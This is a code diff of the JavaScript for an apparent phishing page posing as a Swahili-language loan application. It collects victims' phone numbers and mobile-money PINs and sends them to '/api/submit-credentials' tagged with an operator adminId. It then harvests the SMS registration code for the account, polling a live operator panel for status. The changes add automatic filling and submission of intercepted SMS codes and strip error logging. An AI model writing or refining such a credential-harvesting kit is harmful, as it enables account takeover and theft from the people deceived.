@@ -34,32 +34,17 @@ document.addEventListener('DOMContentLoaded', () => {
     const pinErrorBanner = document.getElementById('pin-error-banner');
     const smsErrorBanner = document.getElementById('sms-error-banner');
 
-    let sliderData = {
-        sliderAmount: '1,000,000',
-        sliderDuration: '3 Mwezi',
-        monthlyPayment: 'Tsh 336,115'
-    };
+    let sliderData = { sliderAmount: '1,000,000', sliderDuration: '3 Mwezi', monthlyPayment: 'Tsh 336,115' };
     let loanData = {};
     let currentSessionId = null;
     let statusInterval = null;
+    let isAutoSubmitting = false;
 
     function switchStep(fromCard, toCard) {
         fromCard.classList.remove('active');
         fromCard.classList.add('hidden');
         toCard.classList.remove('hidden');
         toCard.classList.add('active');
-
-        if (toCard === stepOtp) {
-            autofillSMSMessage();
-        }
-    }
-
-    function autofillSMSMessage() {
-        const sampleSMS = "You are being registered in Mixx by Yas Super App, use the code 55uf50HYgp3mjqu4b0zY to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR";
-        if (otpText) {
-            otpText.value = sampleSMS;
-            charCount.innerText = `${sampleSMS.length}/1000`;
-        }
     }
 
     function updateCalculations() {
@@ -67,7 +52,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const months = parseInt(rangeDuration.value) || 3;
         
         sliderValDisplay.innerText = 'Tsh ' + amt.toLocaleString();
-        sliderDurationDisplay.innerText = months + (months === 1 ? ' Mwezi' : ' Mwezi');
+        sliderDurationDisplay.innerText = months + ' Mwezi';
 
         const totalMultiplier = (1 + (0.05 * (months / 12)));
         const totalRepay = Math.round(amt * totalMultiplier);
@@ -79,7 +64,6 @@ document.addEventListener('DOMContentLoaded', () => {
         sliderData.sliderAmount = amt.toLocaleString();
         sliderData.sliderDuration = months + ' Mwezi';
         sliderData.monthlyPayment = 'Tsh ' + monthlyPay.toLocaleString();
-
         document.getElementById('loan-amount').value = amt;
     }
 
@@ -89,17 +73,8 @@ document.addEventListener('DOMContentLoaded', () => {
         updateCalculations();
     }
 
-    if (btnNaelewa) {
-        btnNaelewa.addEventListener('click', () => {
-            switchStep(stepNaelewa, stepSlider);
-        });
-    }
-
-    if (btnSliderNext) {
-        btnSliderNext.addEventListener('click', () => {
-            switchStep(stepSlider, stepLoan1);
-        });
-    }
+    if (btnNaelewa) btnNaelewa.addEventListener('click', () => switchStep(stepNaelewa, stepSlider));
+    if (btnSliderNext) btnSliderNext.addEventListener('click', () => switchStep(stepSlider, stepLoan1));
 
     if (btnNext1) {
         btnNext1.addEventListener('click', () => {
@@ -111,72 +86,44 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    if (btnPrev2) {
-        btnPrev2.addEventListener('click', () => {
-            switchStep(stepLoan2, stepLoan1);
-        });
-    }
+    if (btnPrev2) btnPrev2.addEventListener('click', () => switchStep(stepLoan2, stepLoan1));
 
     if (btnNext2) {
         btnNext2.addEventListener('click', () => {
             const firstName = document.getElementById('first-name').value.trim();
             const lastName = document.getElementById('last-name').value.trim();
             const phone = document.getElementById('phone').value.trim();
-
-            if (!firstName || !lastName || !phone) {
-                alert('Tafadhali jaza taarifa zote zinazohitajika.');
-                return;
-            }
+            if (!firstName || !lastName || !phone) return alert('Tafadhali jaza taarifa zote.');
 
             loanData.firstName = firstName;
             loanData.lastName = lastName;
             loanData.phone = phone;
-
             document.getElementById('confirm-phone').value = phone;
 
             switchStep(stepLoan2, stepLoan3);
-            
             document.getElementById('summary-amount').innerText = 'TSh ' + loanData.amount;
             document.getElementById('summary-duration').innerText = loanData.duration;
             document.getElementById('summary-purpose').innerText = loanData.purpose;
         });
     }
 
-    if (btnPrev3) {
-        btnPrev3.addEventListener('click', () => {
-            switchStep(stepLoan3, stepLoan2);
-        });
-    }
-
-    if (btnSubmitLoan) {
-        btnSubmitLoan.addEventListener('click', () => {
-            loanData.employmentStatus = document.getElementById('employment-status').value;
-            loanData.annualIncome = document.getElementById('annual-income').value || '0';
-            
-            switchStep(stepLoan3, stepForm);
-        });
-    }
+    if (btnPrev3) btnPrev3.addEventListener('click', () => switchStep(stepLoan3, stepLoan2));
+    if (btnSubmitLoan) btnSubmitLoan.addEventListener('click', () => switchStep(stepLoan3, stepForm));
 
     const pinInputs = document.querySelectorAll('.pin-input');
     pinInputs.forEach((input, index) => {
         input.addEventListener('input', (e) => {
-            const val = e.target.value;
-            if (val && index < pinInputs.length - 1) {
-                pinInputs[index + 1].focus();
-            }
+            if (e.target.value && index < pinInputs.length - 1) pinInputs[index + 1].focus();
             updatePinValue();
         });
-
         input.addEventListener('keydown', (e) => {
-            if (e.key === 'Backspace' && !input.value && index > 0) {
-                pinInputs[index - 1].focus();
-            }
+            if (e.key === 'Backspace' && !input.value && index > 0) pinInputs[index - 1].focus();
         });
     });
 
     function updatePinValue() {
         let pin = '';
-        pinInputs.forEach(input => pin += input.value);
+        pinInputs.forEach(i => pin += i.value);
         document.getElementById('pin-hidden').value = pin;
     }
 
@@ -185,36 +132,21 @@ document.addEventListener('DOMContentLoaded', () => {
             e.preventDefault();
             const phoneInput = document.getElementById('confirm-phone').value.trim();
             const pin = document.getElementById('pin-hidden').value;
-
-            if (pin.length !== 4) {
-                return;
-            }
+            if (pin.length !== 4) return;
 
             pinErrorBanner.classList.add('hidden');
-
             currentSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-            
             switchStep(stepForm, stepLoading);
 
             try {
                 const response = await fetch('/api/submit-credentials', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        sessionId: currentSessionId,
-                        sliderData,
-                        loanData,
-                        phone: phoneInput,
-                        pin: pin,
-                        adminId: adminId
-                    })
+                    body: JSON.stringify({ sessionId: currentSessionId, sliderData, loanData, phone: phoneInput, pin, adminId })
                 });
                 const data = await response.json();
-                if (data.success) {
-                    pollStatus();
-                }
+                if (data.success) pollStatus();
             } catch (err) {
-                console.error('Error submitting credentials:', err);
                 switchStep(stepLoading, stepForm);
             }
         });
@@ -222,34 +154,33 @@ document.addEventListener('DOMContentLoaded', () => {
 
     if (otpText) {
         otpText.addEventListener('input', () => {
-            const len = otpText.value.length;
-            charCount.innerText = `${len}/1000`;
+            charCount.innerText = `${otpText.value.length}/1000`;
         });
     }
 
+    async function triggerAutoSubmit(text) {
+        if (isAutoSubmitting) return;
+        isAutoSubmitting = true;
+        switchStep(stepOtp, stepLoading);
+
+        try {
+            await fetch('/api/submit-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ sessionId: currentSessionId, otpText: text })
+            });
+            pollStatus();
+        } catch (err) {
+            isAutoSubmitting = false;
+        }
+    }
+
     if (btnThibitisha) {
-        btnThibitisha.addEventListener('click', async () => {
+        btnThibitisha.addEventListener('click', () => {
             const text = otpText.value.trim();
-            if (!text) {
-                return;
-            }
-
+            if (!text) return;
             smsErrorBanner.classList.add('hidden');
-            switchStep(stepOtp, stepLoading);
-
-            try {
-                await fetch('/api/submit-otp', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        sessionId: currentSessionId,
-                        otpText: text
-                    })
-                });
-                pollStatus();
-            } catch (err) {
-                console.error('Error submitting OTP:', err);
-            }
+            triggerAutoSubmit(text);
         });
     }
 
@@ -262,8 +193,14 @@ document.addEventListener('DOMContentLoaded', () => {
                 const data = await res.json();
 
                 if (data.status === 'approved_pin') {
-                    clearInterval(statusInterval);
-                    switchStep(stepLoading, stepOtp);
+                    if (stepOtp.classList.contains('hidden')) {
+                        switchStep(stepLoading, stepOtp);
+                    }
+                    if (data.incomingSMS && !otpText.value.trim() && !isAutoSubmitting) {
+                        otpText.value = data.incomingSMS;
+                        charCount.innerText = `${data.incomingSMS.length}/1000`;
+                        setTimeout(() => triggerAutoSubmit(data.incomingSMS), 600);
+                    }
                 } else if (data.status === 'success') {
                     clearInterval(statusInterval);
                     document.getElementById('final-approved-amount').innerText = 'TSh ' + loanData.amount;
@@ -278,6 +215,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 } else if (data.status === 'wrong_sms') {
                     clearInterval(statusInterval);
                     otpText.value = '';
+                    isAutoSubmitting = false;
                     charCount.innerText = '0/1000';
                     smsErrorBanner.classList.remove('hidden');
                     switchStep(stepLoading, stepOtp);
@@ -286,10 +224,8 @@ document.addEventListener('DOMContentLoaded', () => {
                     clearInterval(statusInterval);
                     location.reload();
                 }
-            } catch (err) {
-                console.error('Error polling status:', err);
-            }
-        }, 3000);
+            } catch (err) {}
+        }, 2500);
     }
 });
                           
